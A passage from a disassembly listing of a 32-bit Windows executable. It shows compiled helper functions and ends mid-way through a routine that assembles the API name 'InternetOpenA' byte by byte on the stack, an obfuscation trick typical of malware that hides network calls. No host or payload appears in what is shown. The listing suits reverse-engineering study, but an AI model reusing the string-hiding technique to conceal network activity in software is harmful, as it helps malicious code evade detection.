  401bc5:	89 55 f8             	mov    %edx,-0x8(%ebp)
  401bc8:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401bcb:	3b 45 08             	cmp    0x8(%ebp),%eax
  401bce:	7d 06                	jge    0x401bd6
  401bd0:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401bd3:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  401bd6:	8b 55 f8             	mov    -0x8(%ebp),%edx
  401bd9:	52                   	push   %edx
  401bda:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401bdd:	e8 be 01 00 00       	call   0x401da0
  401be2:	8b e5                	mov    %ebp,%esp
  401be4:	5d                   	pop    %ebp
  401be5:	c2 04 00             	ret    $0x4
  401be8:	cc                   	int3
  401be9:	cc                   	int3
  401bea:	cc                   	int3
  401beb:	cc                   	int3
  401bec:	cc                   	int3
  401bed:	cc                   	int3
  401bee:	cc                   	int3
  401bef:	cc                   	int3
  401bf0:	55                   	push   %ebp
  401bf1:	8b ec                	mov    %esp,%ebp
  401bf3:	83 ec 10             	sub    $0x10,%esp
  401bf6:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  401bf9:	8b 45 0c             	mov    0xc(%ebp),%eax
  401bfc:	50                   	push   %eax
  401bfd:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401c00:	51                   	push   %ecx
  401c01:	e8 0a f5 ff ff       	call   0x401110
  401c06:	83 c4 08             	add    $0x8,%esp
  401c09:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401c0c:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  401c10:	75 04                	jne    0x401c16
  401c12:	33 c0                	xor    %eax,%eax
  401c14:	eb 57                	jmp    0x401c6d
  401c16:	8b 55 fc             	mov    -0x4(%ebp),%edx
  401c19:	0f b7 02             	movzwl (%edx),%eax
  401c1c:	50                   	push   %eax
  401c1d:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401c20:	83 c1 02             	add    $0x2,%ecx
  401c23:	51                   	push   %ecx
  401c24:	e8 d7 03 00 00       	call   0x402000
  401c29:	83 c4 08             	add    $0x8,%esp
  401c2c:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401c2f:	8b 55 f4             	mov    -0xc(%ebp),%edx
  401c32:	52                   	push   %edx
  401c33:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  401c36:	e8 e5 f9 ff ff       	call   0x401620
  401c3b:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401c3e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401c41:	0f b7 08             	movzwl (%eax),%ecx
  401c44:	51                   	push   %ecx
  401c45:	8b 55 fc             	mov    -0x4(%ebp),%edx
  401c48:	83 c2 02             	add    $0x2,%edx
  401c4b:	52                   	push   %edx
  401c4c:	8b 45 f4             	mov    -0xc(%ebp),%eax
  401c4f:	50                   	push   %eax
  401c50:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  401c53:	51                   	push   %ecx
  401c54:	e8 d7 03 00 00       	call   0x402030
  401c59:	83 c4 10             	add    $0x10,%esp
  401c5c:	8b 55 f4             	mov    -0xc(%ebp),%edx
  401c5f:	52                   	push   %edx
  401c60:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  401c63:	e8 78 02 00 00       	call   0x401ee0
  401c68:	b8 01 00 00 00       	mov    $0x1,%eax
  401c6d:	8b e5                	mov    %ebp,%esp
  401c6f:	5d                   	pop    %ebp
  401c70:	c2 08 00             	ret    $0x8
  401c73:	cc                   	int3
  401c74:	cc                   	int3
  401c75:	cc                   	int3
  401c76:	cc                   	int3
  401c77:	cc                   	int3
  401c78:	cc                   	int3
  401c79:	cc                   	int3
  401c7a:	cc                   	int3
  401c7b:	cc                   	int3
  401c7c:	cc                   	int3
  401c7d:	cc                   	int3
  401c7e:	cc                   	int3
  401c7f:	cc                   	int3
  401c80:	55                   	push   %ebp
  401c81:	8b ec                	mov    %esp,%ebp
  401c83:	51                   	push   %ecx
  401c84:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  401c87:	8b 45 08             	mov    0x8(%ebp),%eax
  401c8a:	50                   	push   %eax
  401c8b:	e8 20 03 00 00       	call   0x401fb0
  401c90:	83 c4 04             	add    $0x4,%esp
  401c93:	50                   	push   %eax
  401c94:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401c97:	51                   	push   %ecx
  401c98:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401c9b:	e8 60 02 00 00       	call   0x401f00
  401ca0:	8b e5                	mov    %ebp,%esp
  401ca2:	5d                   	pop    %ebp
  401ca3:	c2 04 00             	ret    $0x4
  401ca6:	cc                   	int3
  401ca7:	cc                   	int3
  401ca8:	cc                   	int3
  401ca9:	cc                   	int3
  401caa:	cc                   	int3
  401cab:	cc                   	int3
  401cac:	cc                   	int3
  401cad:	cc                   	int3
  401cae:	cc                   	int3
  401caf:	cc                   	int3
  401cb0:	55                   	push   %ebp
  401cb1:	8b ec                	mov    %esp,%ebp
  401cb3:	8b 45 14             	mov    0x14(%ebp),%eax
  401cb6:	50                   	push   %eax
  401cb7:	8b 4d 10             	mov    0x10(%ebp),%ecx
  401cba:	51                   	push   %ecx
  401cbb:	8b 55 0c             	mov    0xc(%ebp),%edx
  401cbe:	52                   	push   %edx
  401cbf:	8b 45 08             	mov    0x8(%ebp),%eax
  401cc2:	50                   	push   %eax
  401cc3:	ff 15 14 41 40 00    	call   *0x404114
  401cc9:	83 c4 10             	add    $0x10,%esp
  401ccc:	5d                   	pop    %ebp
  401ccd:	c3                   	ret
  401cce:	cc                   	int3
  401ccf:	cc                   	int3
  401cd0:	55                   	push   %ebp
  401cd1:	8b ec                	mov    %esp,%ebp
  401cd3:	68 0e 00 07 80       	push   $0x8007000e
  401cd8:	e8 53 f3 ff ff       	call   0x401030
  401cdd:	5d                   	pop    %ebp
  401cde:	c3                   	ret
  401cdf:	cc                   	int3
  401ce0:	55                   	push   %ebp
  401ce1:	8b ec                	mov    %esp,%ebp
  401ce3:	83 ec 1c             	sub    $0x1c,%esp
  401ce6:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  401ce9:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  401cec:	e8 cf fb ff ff       	call   0x4018c0
  401cf1:	89 45 f0             	mov    %eax,-0x10(%ebp)
  401cf4:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401cf7:	8b 48 04             	mov    0x4(%eax),%ecx
  401cfa:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  401cfd:	8b 55 f0             	mov    -0x10(%ebp),%edx
  401d00:	8b 02                	mov    (%edx),%eax
  401d02:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  401d05:	8b 09                	mov    (%ecx),%ecx
  401d07:	8b 10                	mov    (%eax),%edx
  401d09:	8b 42 10             	mov    0x10(%edx),%eax
  401d0c:	ff d0                	call   *%eax
  401d0e:	89 45 e8             	mov    %eax,-0x18(%ebp)
  401d11:	6a 01                	push   $0x1
  401d13:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401d16:	51                   	push   %ecx
  401d17:	8b 55 e8             	mov    -0x18(%ebp),%edx
  401d1a:	8b 02                	mov    (%edx),%eax
  401d1c:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  401d1f:	8b 10                	mov    (%eax),%edx
  401d21:	ff d2                	call   *%edx
  401d23:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401d26:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  401d2a:	75 05                	jne    0x401d31
  401d2c:	e8 9f ff ff ff       	call   0x401cd0
  401d31:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401d34:	3b 45 08             	cmp    0x8(%ebp),%eax
  401d37:	7d 08                	jge    0x401d41
  401d39:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  401d3c:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  401d3f:	eb 06                	jmp    0x401d47
  401d41:	8b 55 08             	mov    0x8(%ebp),%edx
  401d44:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  401d47:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401d4a:	83 c0 01             	add    $0x1,%eax
  401d4d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401d50:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401d53:	51                   	push   %ecx
  401d54:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  401d57:	e8 d4 f4 ff ff       	call   0x401230
  401d5c:	50                   	push   %eax
  401d5d:	8b 55 fc             	mov    -0x4(%ebp),%edx
  401d60:	52                   	push   %edx
  401d61:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401d64:	e8 c7 f4 ff ff       	call   0x401230
  401d69:	50                   	push   %eax
  401d6a:	e8 41 ff ff ff       	call   0x401cb0
  401d6f:	83 c4 10             	add    $0x10,%esp
  401d72:	8b 45 f4             	mov    -0xc(%ebp),%eax
  401d75:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  401d78:	89 48 04             	mov    %ecx,0x4(%eax)
  401d7b:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  401d7e:	e8 2d f5 ff ff       	call   0x4012b0
  401d83:	8b 55 f4             	mov    -0xc(%ebp),%edx
  401d86:	52                   	push   %edx
  401d87:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  401d8a:	e8 a1 fd ff ff       	call   0x401b30
  401d8f:	8b e5                	mov    %ebp,%esp
  401d91:	5d                   	pop    %ebp
  401d92:	c2 04 00             	ret    $0x4
  401d95:	cc                   	int3
  401d96:	cc                   	int3
  401d97:	cc                   	int3
  401d98:	cc                   	int3
  401d99:	cc                   	int3
  401d9a:	cc                   	int3
  401d9b:	cc                   	int3
  401d9c:	cc                   	int3
  401d9d:	cc                   	int3
  401d9e:	cc                   	int3
  401d9f:	cc                   	int3
  401da0:	55                   	push   %ebp
  401da1:	8b ec                	mov    %esp,%ebp
  401da3:	83 ec 10             	sub    $0x10,%esp
  401da6:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  401da9:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  401dac:	e8 0f fb ff ff       	call   0x4018c0
  401db1:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401db4:	8b 45 f4             	mov    -0xc(%ebp),%eax
  401db7:	8b 08                	mov    (%eax),%ecx
  401db9:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  401dbc:	8b 55 f4             	mov    -0xc(%ebp),%edx
  401dbf:	8b 42 08             	mov    0x8(%edx),%eax
  401dc2:	3b 45 08             	cmp    0x8(%ebp),%eax
  401dc5:	7d 06                	jge    0x401dcd
  401dc7:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  401dcb:	7f 07                	jg     0x401dd4
  401dcd:	e8 fe fe ff ff       	call   0x401cd0
  401dd2:	eb 31                	jmp    0x401e05
  401dd4:	6a 01                	push   $0x1
  401dd6:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401dd9:	51                   	push   %ecx
  401dda:	8b 55 f4             	mov    -0xc(%ebp),%edx
  401ddd:	52                   	push   %edx
  401dde:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401de1:	8b 10                	mov    (%eax),%edx
  401de3:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  401de6:	8b 42 08             	mov    0x8(%edx),%eax
  401de9:	ff d0                	call   *%eax
  401deb:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401dee:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  401df2:	75 05                	jne    0x401df9
  401df4:	e8 d7 fe ff ff       	call   0x401cd0
  401df9:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401dfc:	51                   	push   %ecx
  401dfd:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  401e00:	e8 2b fd ff ff       	call   0x401b30
  401e05:	8b e5                	mov    %ebp,%esp
  401e07:	5d                   	pop    %ebp
  401e08:	c2 04 00             	ret    $0x4
  401e0b:	cc                   	int3
  401e0c:	cc                   	int3
  401e0d:	cc                   	int3
  401e0e:	cc                   	int3
  401e0f:	cc                   	int3
  401e10:	55                   	push   %ebp
  401e11:	8b ec                	mov    %esp,%ebp
  401e13:	83 ec 08             	sub    $0x8,%esp
  401e16:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  401e1d:	8b 45 08             	mov    0x8(%ebp),%eax
  401e20:	8b 08                	mov    (%eax),%ecx
  401e22:	8b 55 08             	mov    0x8(%ebp),%edx
  401e25:	8b 02                	mov    (%edx),%eax
  401e27:	8b 11                	mov    (%ecx),%edx
  401e29:	8b c8                	mov    %eax,%ecx
  401e2b:	8b 42 10             	mov    0x10(%edx),%eax
  401e2e:	ff d0                	call   *%eax
  401e30:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401e33:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401e36:	e8 35 f4 ff ff       	call   0x401270
  401e3b:	0f b6 c8             	movzbl %al,%ecx
  401e3e:	85 c9                	test   %ecx,%ecx
  401e40:	75 1a                	jne    0x401e5c
  401e42:	8b 55 08             	mov    0x8(%ebp),%edx
  401e45:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401e48:	3b 02                	cmp    (%edx),%eax
  401e4a:	75 10                	jne    0x401e5c
  401e4c:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401e4f:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  401e52:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401e55:	e8 f6 f3 ff ff       	call   0x401250
  401e5a:	eb 5d                	jmp    0x401eb9
  401e5c:	6a 01                	push   $0x1
  401e5e:	8b 55 08             	mov    0x8(%ebp),%edx
  401e61:	8b 42 04             	mov    0x4(%edx),%eax
  401e64:	50                   	push   %eax
  401e65:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  401e68:	8b 11                	mov    (%ecx),%edx
  401e6a:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  401e6d:	8b 02                	mov    (%edx),%eax
  401e6f:	ff d0                	call   *%eax
  401e71:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401e74:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  401e78:	75 05                	jne    0x401e7f
  401e7a:	e8 51 fe ff ff       	call   0x401cd0
  401e7f:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401e82:	8b 55 08             	mov    0x8(%ebp),%edx
  401e85:	8b 42 04             	mov    0x4(%edx),%eax
  401e88:	89 41 04             	mov    %eax,0x4(%ecx)
  401e8b:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401e8e:	8b 51 04             	mov    0x4(%ecx),%edx
  401e91:	83 c2 01             	add    $0x1,%edx
  401e94:	52                   	push   %edx
  401e95:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401e98:	e8 93 f3 ff ff       	call   0x401230
  401e9d:	50                   	push   %eax
  401e9e:	8b 45 08             	mov    0x8(%ebp),%eax
  401ea1:	8b 48 04             	mov    0x4(%eax),%ecx
  401ea4:	83 c1 01             	add    $0x1,%ecx
  401ea7:	51                   	push   %ecx
  401ea8:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401eab:	e8 80 f3 ff ff       	call   0x401230
  401eb0:	50                   	push   %eax
  401eb1:	e8 fa fd ff ff       	call   0x401cb0
  401eb6:	83 c4 10             	add    $0x10,%esp
  401eb9:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401ebc:	8b e5                	mov    %ebp,%esp
  401ebe:	5d                   	pop    %ebp
  401ebf:	c3                   	ret
  401ec0:	55                   	push   %ebp
  401ec1:	8b ec                	mov    %esp,%ebp
  401ec3:	6a 00                	push   $0x0
  401ec5:	8b 45 08             	mov    0x8(%ebp),%eax
  401ec8:	50                   	push   %eax
  401ec9:	e8 e2 f2 ff ff       	call   0x4011b0
  401ece:	83 c4 08             	add    $0x8,%esp
  401ed1:	5d                   	pop    %ebp
  401ed2:	c3                   	ret
  401ed3:	cc                   	int3
  401ed4:	cc                   	int3
  401ed5:	cc                   	int3
  401ed6:	cc                   	int3
  401ed7:	cc                   	int3
  401ed8:	cc                   	int3
  401ed9:	cc                   	int3
  401eda:	cc                   	int3
  401edb:	cc                   	int3
  401edc:	cc                   	int3
  401edd:	cc                   	int3
  401ede:	cc                   	int3
  401edf:	cc                   	int3
  401ee0:	55                   	push   %ebp
  401ee1:	8b ec                	mov    %esp,%ebp
  401ee3:	51                   	push   %ecx
  401ee4:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  401ee7:	8b 45 08             	mov    0x8(%ebp),%eax
  401eea:	50                   	push   %eax
  401eeb:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401eee:	e8 3d fa ff ff       	call   0x401930
  401ef3:	8b e5                	mov    %ebp,%esp
  401ef5:	5d                   	pop    %ebp
  401ef6:	c2 04 00             	ret    $0x4
  401ef9:	cc                   	int3
  401efa:	cc                   	int3
  401efb:	cc                   	int3
  401efc:	cc                   	int3
  401efd:	cc                   	int3
  401efe:	cc                   	int3
  401eff:	cc                   	int3
  401f00:	55                   	push   %ebp
  401f01:	8b ec                	mov    %esp,%ebp
  401f03:	83 ec 10             	sub    $0x10,%esp
  401f06:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  401f09:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  401f0d:	75 0d                	jne    0x401f1c
  401f0f:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  401f12:	e8 49 01 00 00       	call   0x402060
  401f17:	e9 8d 00 00 00       	jmp    0x401fa9
  401f1c:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  401f20:	75 0a                	jne    0x401f2c
  401f22:	68 57 00 07 80       	push   $0x80070057
  401f27:	e8 04 f1 ff ff       	call   0x401030
  401f2c:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  401f2f:	e8 3c f9 ff ff       	call   0x401870
  401f34:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401f37:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  401f3a:	e8 51 f9 ff ff       	call   0x401890
  401f3f:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401f42:	2b c8                	sub    %eax,%ecx
  401f44:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  401f47:	8b 55 0c             	mov    0xc(%ebp),%edx
  401f4a:	52                   	push   %edx
  401f4b:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  401f4e:	e8 cd f6 ff ff       	call   0x401620
  401f53:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401f56:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401f59:	3b 45 fc             	cmp    -0x4(%ebp),%eax
  401f5c:	77 22                	ja     0x401f80
  401f5e:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  401f61:	51                   	push   %ecx
  401f62:	8b 55 f4             	mov    -0xc(%ebp),%edx
  401f65:	03 55 f8             	add    -0x8(%ebp),%edx
  401f68:	52                   	push   %edx
  401f69:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  401f6c:	e8 5f 01 00 00       	call   0x4020d0
  401f71:	50                   	push   %eax
  401f72:	8b 45 f4             	mov    -0xc(%ebp),%eax
  401f75:	50                   	push   %eax
  401f76:	e8 75 01 00 00       	call   0x4020f0
  401f7b:	83 c4 10             	add    $0x10,%esp
  401f7e:	eb 1d                	jmp    0x401f9d
  401f80:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  401f83:	51                   	push   %ecx
  401f84:	8b 55 08             	mov    0x8(%ebp),%edx
  401f87:	52                   	push   %edx
  401f88:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  401f8b:	e8 40 01 00 00       	call   0x4020d0
  401f90:	50                   	push   %eax
  401f91:	8b 45 f4             	mov    -0xc(%ebp),%eax
  401f94:	50                   	push   %eax
  401f95:	e8 16 fd ff ff       	call   0x401cb0
  401f9a:	83 c4 10             	add    $0x10,%esp
  401f9d:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  401fa0:	51                   	push   %ecx
  401fa1:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  401fa4:	e8 37 ff ff ff       	call   0x401ee0
  401fa9:	8b e5                	mov    %ebp,%esp
  401fab:	5d                   	pop    %ebp
  401fac:	c2 08 00             	ret    $0x8
  401faf:	cc                   	int3
  401fb0:	55                   	push   %ebp
  401fb1:	8b ec                	mov    %esp,%ebp
  401fb3:	83 ec 10             	sub    $0x10,%esp
  401fb6:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  401fba:	75 04                	jne    0x401fc0
  401fbc:	33 c0                	xor    %eax,%eax
  401fbe:	eb 2d                	jmp    0x401fed
  401fc0:	8b 45 08             	mov    0x8(%ebp),%eax
  401fc3:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401fc6:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401fc9:	83 c1 01             	add    $0x1,%ecx
  401fcc:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  401fcf:	8b 55 fc             	mov    -0x4(%ebp),%edx
  401fd2:	8a 02                	mov    (%edx),%al
  401fd4:	88 45 f7             	mov    %al,-0x9(%ebp)
  401fd7:	83 45 fc 01          	addl   $0x1,-0x4(%ebp)
  401fdb:	80 7d f7 00          	cmpb   $0x0,-0x9(%ebp)
  401fdf:	75 ee                	jne    0x401fcf
  401fe1:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401fe4:	2b 4d f8             	sub    -0x8(%ebp),%ecx
  401fe7:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  401fea:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401fed:	8b e5                	mov    %ebp,%esp
  401fef:	5d                   	pop    %ebp
  401ff0:	c3                   	ret
  401ff1:	cc                   	int3
  401ff2:	cc                   	int3
  401ff3:	cc                   	int3
  401ff4:	cc                   	int3
  401ff5:	cc                   	int3
  401ff6:	cc                   	int3
  401ff7:	cc                   	int3
  401ff8:	cc                   	int3
  401ff9:	cc                   	int3
  401ffa:	cc                   	int3
  401ffb:	cc                   	int3
  401ffc:	cc                   	int3
  401ffd:	cc                   	int3
  401ffe:	cc                   	int3
  401fff:	cc                   	int3
  402000:	55                   	push   %ebp
  402001:	8b ec                	mov    %esp,%ebp
  402003:	6a 00                	push   $0x0
  402005:	6a 00                	push   $0x0
  402007:	6a 00                	push   $0x0
  402009:	6a 00                	push   $0x0
  40200b:	8b 45 0c             	mov    0xc(%ebp),%eax
  40200e:	50                   	push   %eax
  40200f:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402012:	51                   	push   %ecx
  402013:	6a 00                	push   $0x0
  402015:	e8 e6 ef ff ff       	call   0x401000
  40201a:	50                   	push   %eax
  40201b:	ff 15 0c 40 40 00    	call   *0x40400c
  402021:	5d                   	pop    %ebp
  402022:	c3                   	ret
  402023:	cc                   	int3
  402024:	cc                   	int3
  402025:	cc                   	int3
  402026:	cc                   	int3
  402027:	cc                   	int3
  402028:	cc                   	int3
  402029:	cc                   	int3
  40202a:	cc                   	int3
  40202b:	cc                   	int3
  40202c:	cc                   	int3
  40202d:	cc                   	int3
  40202e:	cc                   	int3
  40202f:	cc                   	int3
  402030:	55                   	push   %ebp
  402031:	8b ec                	mov    %esp,%ebp
  402033:	6a 00                	push   $0x0
  402035:	6a 00                	push   $0x0
  402037:	8b 45 0c             	mov    0xc(%ebp),%eax
  40203a:	50                   	push   %eax
  40203b:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40203e:	51                   	push   %ecx
  40203f:	8b 55 14             	mov    0x14(%ebp),%edx
  402042:	52                   	push   %edx
  402043:	8b 45 10             	mov    0x10(%ebp),%eax
  402046:	50                   	push   %eax
  402047:	6a 00                	push   $0x0
  402049:	e8 b2 ef ff ff       	call   0x401000
  40204e:	50                   	push   %eax
  40204f:	ff 15 0c 40 40 00    	call   *0x40400c
  402055:	5d                   	pop    %ebp
  402056:	c3                   	ret
  402057:	cc                   	int3
  402058:	cc                   	int3
  402059:	cc                   	int3
  40205a:	cc                   	int3
  40205b:	cc                   	int3
  40205c:	cc                   	int3
  40205d:	cc                   	int3
  40205e:	cc                   	int3
  40205f:	cc                   	int3
  402060:	55                   	push   %ebp
  402061:	8b ec                	mov    %esp,%ebp
  402063:	83 ec 10             	sub    $0x10,%esp
  402066:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  402069:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40206c:	e8 4f f8 ff ff       	call   0x4018c0
  402071:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402074:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402077:	8b 08                	mov    (%eax),%ecx
  402079:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40207c:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40207f:	83 7a 04 00          	cmpl   $0x0,0x4(%edx)
  402083:	75 02                	jne    0x402087
  402085:	eb 3f                	jmp    0x4020c6
  402087:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40208a:	e8 e1 f1 ff ff       	call   0x401270
  40208f:	0f b6 c0             	movzbl %al,%eax
  402092:	85 c0                	test   %eax,%eax
  402094:	74 0c                	je     0x4020a2
  402096:	6a 00                	push   $0x0
  402098:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40209b:	e8 90 f8 ff ff       	call   0x401930
  4020a0:	eb 24                	jmp    0x4020c6
  4020a2:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4020a5:	e8 06 f2 ff ff       	call   0x4012b0
  4020aa:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4020ad:	8b 11                	mov    (%ecx),%edx
  4020af:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4020b2:	8b 42 0c             	mov    0xc(%edx),%eax
  4020b5:	ff d0                	call   *%eax
  4020b7:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4020ba:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4020bd:	51                   	push   %ecx
  4020be:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4020c1:	e8 6a fa ff ff       	call   0x401b30
  4020c6:	8b e5                	mov    %ebp,%esp
  4020c8:	5d                   	pop    %ebp
  4020c9:	c3                   	ret
  4020ca:	cc                   	int3
  4020cb:	cc                   	int3
  4020cc:	cc                   	int3
  4020cd:	cc                   	int3
  4020ce:	cc                   	int3
  4020cf:	cc                   	int3
  4020d0:	55                   	push   %ebp
  4020d1:	8b ec                	mov    %esp,%ebp
  4020d3:	51                   	push   %ecx
  4020d4:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4020d7:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4020da:	e8 e1 f7 ff ff       	call   0x4018c0
  4020df:	8b 40 08             	mov    0x8(%eax),%eax
  4020e2:	8b e5                	mov    %ebp,%esp
  4020e4:	5d                   	pop    %ebp
  4020e5:	c3                   	ret
  4020e6:	cc                   	int3
  4020e7:	cc                   	int3
  4020e8:	cc                   	int3
  4020e9:	cc                   	int3
  4020ea:	cc                   	int3
  4020eb:	cc                   	int3
  4020ec:	cc                   	int3
  4020ed:	cc                   	int3
  4020ee:	cc                   	int3
  4020ef:	cc                   	int3
  4020f0:	55                   	push   %ebp
  4020f1:	8b ec                	mov    %esp,%ebp
  4020f3:	8b 45 14             	mov    0x14(%ebp),%eax
  4020f6:	50                   	push   %eax
  4020f7:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4020fa:	51                   	push   %ecx
  4020fb:	8b 55 0c             	mov    0xc(%ebp),%edx
  4020fe:	52                   	push   %edx
  4020ff:	8b 45 08             	mov    0x8(%ebp),%eax
  402102:	50                   	push   %eax
  402103:	ff 15 20 41 40 00    	call   *0x404120
  402109:	83 c4 10             	add    $0x10,%esp
  40210c:	5d                   	pop    %ebp
  40210d:	c3                   	ret
  40210e:	cc                   	int3
  40210f:	cc                   	int3
  402110:	55                   	push   %ebp
  402111:	8b ec                	mov    %esp,%ebp
  402113:	81 ec a0 00 00 00    	sub    $0xa0,%esp
  402119:	a1 18 50 40 00       	mov    0x405018,%eax
  40211e:	33 c5                	xor    %ebp,%eax
  402120:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402123:	c6 45 a8 49          	movb   $0x49,-0x58(%ebp)
  402127:	c6 45 a9 6e          	movb   $0x6e,-0x57(%ebp)
  40212b:	c6 45 aa 74          	movb   $0x74,-0x56(%ebp)
  40212f:	c6 45 ab 65          	movb   $0x65,-0x55(%ebp)
  402133:	c6 45 ac 72          	movb   $0x72,-0x54(%ebp)
  402137:	c6 45 ad 6e          	movb   $0x6e,-0x53(%ebp)
  40213b:	c6 45 ae 65          	movb   $0x65,-0x52(%ebp)
  40213f:	c6 45 af 74          	movb   $0x74,-0x51(%ebp)
  402143:	c6 45 b0 4f          	movb   $0x4f,-0x50(%ebp)
  402147:	c6 45 b1 70          	movb   $0x70,-0x4f(%ebp)
  40214b:	c6 45 b2 65          	movb   $0x65,-0x4e(%ebp)
  40214f:	c6 45 b3 6e          	movb   $0x6e,-0x4d(%ebp)
  402153:	c6 45 b4 41          	movb   $0x41,-0x4c(%ebp)
  402157:	c6 45 b5 00          	movb   $0x0,-0x4b(%ebp)
  40215b:	c6 45 94 49          	movb   $0x49,-0x6c(%ebp)
  40215f:	c6 45 95 6e          	movb   $0x6e,-0x6b(%ebp)
  402163:	c6 45 96 74          	movb   $0x74,-0x6a(%ebp)
  402167:	c6 45 97 65          	movb   $0x65,-0x69(%ebp)
  40216b:	c6 45 98 72          	movb   $0x72,-0x68(%ebp)
  40216f:	c6 45 99 6e          	movb   $0x6e,-0x67(%ebp)
  402173:	c6 45 9a 65          	movb   $0x65,-0x66(%ebp)
  402177:	c6 45 9b 74          	movb   $0x74,-0x65(%ebp)
